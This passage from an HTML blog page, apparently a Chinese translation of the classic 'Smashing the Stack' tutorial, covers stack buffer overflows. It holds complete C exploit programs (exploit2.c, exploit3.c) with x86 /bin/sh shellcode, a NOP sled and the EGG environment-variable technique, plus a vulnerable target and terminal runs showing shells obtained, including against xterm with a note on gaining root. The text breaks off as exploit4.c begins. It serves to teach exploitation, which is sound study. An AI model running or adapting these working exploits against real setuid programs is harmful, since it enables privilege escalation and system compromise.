+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> 
+        <span class=n>large_string</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=n>large_string</span><span class=p>);</span>
+<span class=p>}</span> 
+<span class=cm>/*
+</span><span class=cm>[aleph1]$ gcc -o exploit1 exploit1.c 
+</span><span class=cm>[aleph1]$ ./exploit1 
+</span><span class=cm>$ exit exit 
+</span><span class=cm>[aleph1]$
+</span><span class=cm>*/</span>
+</code></pre></td></tr></table></div></div></div><p>我们在上面所做的是用数组<code>large_string[]</code>的地址去填充<code>buffer[]</code>，这就是我们的代码所在的位置。然后我们将shellcode复制到<code>large_string[]</code>中。<code>strcpy()</code>将把<code>large_string[]</code>复制到<code>buffer[]</code>中，而不做任何边界检查，并且将使返回地址溢出，用代码现在所在的地址覆盖它。一旦我们到达main的末尾，它试图返回，它就会跳转到我们的代码，并执行一个shell。当我们试图使另一个程序的缓冲区溢出时，我们面临的问题是试图找出缓冲区（以及我们的代码）的地址。这个问题的答案是，对于每个程序，堆栈都将从相同的地址开始。大多数程序在任何时候都不会将超过几百或几千字节的数据推入堆栈。因此，通过知道堆栈从何处开始，我们可以尝试猜测要溢出的缓冲区将在何处。下面是一个小程序，它将打印堆栈指针：</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//sp.c
+</span><span class=c1></span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_sp</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;movl %esp,%eax&#34;</span><span class=p>);</span>
+<span class=p>}</span> 
+<span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span> 
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>get_sp</span><span class=p>());</span>
+<span class=p>}</span>
+
+<span class=cm>/* 
+</span><span class=cm>[aleph1]$ ./sp 
+</span><span class=cm>0x8000470 
+</span><span class=cm>[aleph1]$
+</span><span class=cm>*/</span>
+</code></pre></td></tr></table></div></div></div><p>让我们假设下面这个是我们要溢出的程序</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//vulnerable.c
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>512</span><span class=p>];</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span>
+        <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>我们可以创建一个程序，将缓冲区大小和它自身堆栈指针的偏移量（我们认为要溢出的缓冲区可能存在的位置）作为参数。我们将把溢出字符串放在一个环境变量中，这样更容易操作</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//exploit2.c
+</span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt; </span><span class=cp>
+</span><span class=cp></span>
+<span class=cp>#define DEFAULT_OFFSET	0
+</span><span class=cp>#define DEFAULT_BUFFER_SIZE	512
+</span><span class=cp></span>
+<span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x80\xe8\xdc\xff\xff\xff</span><span class=s>/bin/sh&#34;</span><span class=p>;</span>
+
+<span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_sp</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;movl %esp,%eax&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=o>*</span><span class=n>buff</span><span class=p>,</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
+    <span class=kt>long</span> <span class=o>*</span><span class=n>addr_ptr</span><span class=p>,</span> <span class=n>addr</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>offset</span><span class=o>=</span><span class=n>DEFAULT_OFFSET</span><span class=p>,</span> <span class=n>bsize</span><span class=o>=</span><span class=n>DEFAULT_BUFFER_SIZE</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
+    
+	<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=n>bsize</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
+    
+	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>buff</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>bsize</span><span class=p>)))</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t allocate memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+	<span class=p>}</span>
+    
+	<span class=n>addr</span> <span class=o>=</span> <span class=n>get_sp</span><span class=p>()</span> <span class=o>-</span> <span class=n>offset</span><span class=p>;</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Using address: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+    
+	<span class=n>ptr</span> <span class=o>=</span> <span class=n>buff</span><span class=p>;</span>
+    <span class=n>addr_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)</span> <span class=n>ptr</span><span class=p>;</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>bsize</span><span class=p>;</span> <span class=n>i</span><span class=o>+=</span><span class=mi>4</span><span class=p>)</span> 
+        <span class=o>*</span><span class=p>(</span><span class=n>addr_ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>addr</span><span class=p>;</span>
+    
+	<span class=n>ptr</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>;</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
+    
+	<span class=n>buff</span><span class=p>[</span><span class=n>bsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span> 
+    
+    <span class=n>memcpy</span><span class=p>(</span><span class=n>buff</span><span class=p>,</span><span class=s>&#34;EGG=&#34;</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
+    <span class=n>putenv</span><span class=p>(</span><span class=n>buff</span><span class=p>);</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+</code></pre></td></tr></table></div></div></div><p>现在我们可以尝试去猜buffer和偏移量是什么了</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit2 <span class=m>500</span> 
+Using address: 0xbffffdb4 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$EGG</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>exit</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit2 <span class=m>600</span> 
+Using address: 0xbffffdb4 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$EGG</span> 
+Illegal instruction 
+<span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>exit</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit2 <span class=m>600</span> <span class=m>100</span> 
+Using address: 0xbffffd4c 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$EGG</span> 
+Segmentation fault 
+<span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>exit</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit2 <span class=m>600</span> <span class=m>200</span> 
+Using address: 0xbffffce8 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$EGG</span> 
+Segmentation fault 
+<span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>exit</span>
+.
+.
+.
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit2 <span class=m>600</span> <span class=m>1564</span> 
+Using address: 0xbffff794 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$EGG</span> 
+$
+</code></pre></td></tr></table></div></div></div><p>正如我们所看到的，这不是一个有效率的过程。即使我们知道堆栈的起始位置，也几乎不可能猜测偏移量。我们最多需要一百次，最坏也需要几千次。问题是我们需要精确地猜测代码的地址将从哪里开始。如果我们多猜一个字节或少猜一个字节，我们只会得到一个段错误(segmentation violation)或一个非法指令(invalid instruction)。增加机会的一种方法是用NOP指令填充溢出缓冲区的前端。几乎所有处理器都有执行空操作的<code>NOP</code>指令。它通常用于延迟执行时间。我们将利用它并用它们填充溢出缓冲区的一半。我们将把我们的shellcode放在中心，然后在她后面放上返回地址。如果幸运的话，返回地址指向nop字符串中的任何一个地方，它们就会被执行，直到到达我们的代码为止。在英特尔体系结构中，NOP指令的长度为一个字节，在机器代码中转换为<code>0x90</code>。假设堆栈从地址<code>0xFF</code>开始，<code>S</code>代表<code>shell</code>代码，<code>N</code>代表<code>NOP</code>指令，新堆栈将如下所示：</p><p><img src=stack5.png alt></p><p>新的exp如下<code>exploit3.c</code>所示</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//exploit3.c
+</span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt; </span><span class=cp>
+</span><span class=cp>#define DEFAULT_OFFSET			0
+</span><span class=cp>#define DEFAULT_BUFFER_SIZE		512 
+</span><span class=cp>#define NOP						0x90
+</span><span class=cp></span>
+<span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x80\xe8\xdc\xff\xff\xff</span><span class=s>/bin/sh&#34;</span><span class=p>;</span>
+
+<span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_sp</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;movl %esp,%eax&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=o>*</span><span class=n>buff</span><span class=p>,</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
+    <span class=kt>long</span> <span class=o>*</span><span class=n>addr_ptr</span><span class=p>,</span> <span class=n>addr</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>offset</span><span class=o>=</span><span class=n>DEFAULT_OFFSET</span><span class=p>,</span> <span class=n>bsize</span><span class=o>=</span><span class=n>DEFAULT_BUFFER_SIZE</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
+    
+	<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=n>bsize</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
+
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>buff</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>bsize</span><span class=p>)))</span> <span class=p>{</span> 
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t allocate memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    
+	<span class=n>addr</span> <span class=o>=</span> <span class=n>get_sp</span><span class=p>()</span> <span class=o>-</span> <span class=n>offset</span><span class=p>;</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Using address: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+    
+	<span class=n>ptr</span> <span class=o>=</span> <span class=n>buff</span><span class=p>;</span>
+    <span class=n>addr_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)</span> <span class=n>ptr</span><span class=p>;</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>bsize</span><span class=p>;</span> <span class=n>i</span><span class=o>+=</span><span class=mi>4</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>addr_ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>addr</span><span class=p>;</span>
+    
+	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>bsize</span><span class=o>/</span><span class=mi>2</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+        <span class=n>buff</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>NOP</span><span class=p>;</span>
+    
+	<span class=n>ptr</span> <span class=o>=</span> <span class=n>buff</span> <span class=o>+</span> <span class=p>((</span><span class=n>bsize</span><span class=o>/</span><span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>));</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
+    
+	<span class=n>buff</span><span class=p>[</span><span class=n>bsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+    
+	<span class=n>memcpy</span><span class=p>(</span><span class=n>buff</span><span class=p>,</span><span class=s>&#34;EGG=&#34;</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
+    <span class=n>putenv</span><span class=p>(</span><span class=n>buff</span><span class=p>);</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>缓冲区大小的一个好选择是比我们试图溢出的缓冲区大小多大约100字节。这将把我们的代码放在我们试图溢出的缓冲区的末尾，为nop提供大量的空间，但是仍然用我们猜测的地址覆盖返回地址。我们试图溢出的缓冲区是512字节长，所以我们将使用612。让我们尝试用新的漏洞溢出测试程序：</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit3 <span class=m>612</span> 
+Using address: 0xbffffdb4
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$EGG</span> 
+$
+</code></pre></td></tr></table></div></div></div><p>哇！第一次尝试就成功了！这一变化使我们的机会增加了一百倍。现在让我们在一个缓冲区溢出的真实案例中尝试一下。我们将使用Xt库上的缓冲区溢出进行演示。对于我们的示例，我们将使用xterm（所有与Xt库链接的程序都是易受攻击的）。您必须运行X服务器并允许从本地主机连接到它，请据此设置显示变量。</p><blockquote><p>xterm 是一个 X Window System上的终端模拟器，类似现在的XShell</p></blockquote><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>export</span> <span class=nv>DISPLAY</span><span class=o>=</span>:0.0 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit3 <span class=m>1124</span> 
+Using address: 0xbffffdb4 
+<span class=o>[</span>aleph1<span class=o>]</span>$ /usr/X11R6/bin/xterm -fg <span class=nv>$EGG</span>
+^C 
+<span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>exit</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit3 <span class=m>2148</span> <span class=m>100</span> Using address: 0xbffffd48 
+<span class=o>[</span>aleph1<span class=o>]</span>$ /usr/X11R6/bin/xterm -fg <span class=nv>$EGG</span>
+
+.... 
+Warning: some arguments in previous message were lost Illegal instruction 
+<span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>exit</span> 
+. 
+. 
+. 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit4 <span class=m>2148</span> <span class=m>600</span> 
+Using address: 0xbffffb54 
+<span class=o>[</span>aleph1<span class=o>]</span>$ /usr/X11R6/bin/xterm -fg <span class=nv>$EGG</span> 
+Warning: some arguments in previous message were lost 
+bash$
+</code></pre></td></tr></table></div></div></div><p>Eureka！不到十几次尝试，我们发现了这个神奇的数字。如果xterm是以suid root安装的，那么它现在就是一个有root权限的shell了！</p><h3 id=small-buffer-overflows><a href=#small-buffer-overflows class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Small Buffer Overflows</h3><p>有时，你试图溢出的缓冲区太小，以至于shellcode无法放入其中，它将用指令而不是代码的地址覆盖返回地址，或者您可以填充字符串前面的nop太少，猜测其地址的机会微乎其微。为了从这些程序中获得一个shell，我们必须用另一种方法。只有当您可以访问程序的环境变量时，这种特殊的方法才有效。我们要做的是将shellcode放在一个环境变量中，然后用内存中这个变量的地址溢出缓冲区。此方法还增加了对漏洞利用的更改，因为您可以使容纳shell代码的环境变量尽可能大。当程序启动时，环境变量存储在堆栈的顶部，setenv（）所做的任何修改都会分配到其他地方。开始时的堆栈如下所示：</p><pre><code>&lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;envp&gt;
+</code></pre><p>我们新程序会带来一个额外的变量，即包含shellcode和nop的变量的大小。我们的新漏洞现在看起来像这样：</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//exploit4.c
